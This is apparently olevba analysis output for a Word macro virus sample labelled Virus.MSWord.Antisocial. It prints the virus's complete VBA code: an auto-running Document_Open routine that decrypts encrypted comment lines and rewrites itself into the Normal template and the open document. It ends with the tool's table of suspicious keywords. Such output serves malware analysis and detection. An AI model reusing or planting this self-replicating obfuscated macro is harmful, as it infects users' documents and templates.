olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial-d27a9bf0b0a3ae6c3ef2de23ab95dbe3600cd4ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial-d27a9bf0b0a3ae6c3ef2de23ab95dbe3600cd4ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
If MacroContainer.FullName = ActiveDocument.FullName Then GoTo ADD Else GoTo NDD
NDD: For d = 11 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End
ADD: For d = 11 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End Sub
'6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Uvzouty4Yg|kTuxsgrVxusvz&C&6
'5Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5
'5Xjy%HR%B%RfhwtHtsyfnsjw3[GUwtojhy3[GHtrutsjsyx3Nyjr-6.3HtijRtizqj
'3Vhw#DG#@#DfwlyhGrfxphqw1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh
'3Vhw#QW#@#QrupdoWhpsodwh1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh
'7Mvy'k'D'88'[v'JT5Jv|u{VmSpulzA'J+'D'))A'P'D'/JT5Spulz/k3'800
'1g!>!Jou)Soe!+!9*!,!2;!Gps!Y!>!2!Up!Mfo)J*;!C%!>!Btd)Nje)J-!Y-!2**!,!g;!D%!>!D%!'!Dis)C%*;!Ofyu!Y;!B!>!D%
'7ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5YlwshjlSpul'k3').)'-'m'-'HA'Ul{'k
'7TJ'D'JT5Spulz/83'JT5Jv|u{VmSpulz0
'6GJ4JkrkzkRotky&72&GJ4Iu{tzUlRotky@&GJ4GjjLxusYzxotm&SI
'1OU/EfmfufMjoft!2-!OU/DpvouPgMjoft;!OU/BeeGspnTusjoh!ND
'4EgxmziHsgyqirx2WeziEw$JmpiReqi>AEgxmziHsgyqirx2JyppReqi>$Irh$Wyf
'7Wyp}h{l'Z|i']pl~]IJvkl/0A'Luk'Z|i
'7Wyp}h{l'Z|i'[vvszThjyv/0A'Luk'Z|i
'3*^Vdvfkl£Zx£Ol`£E|#O|v£NrylfN
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

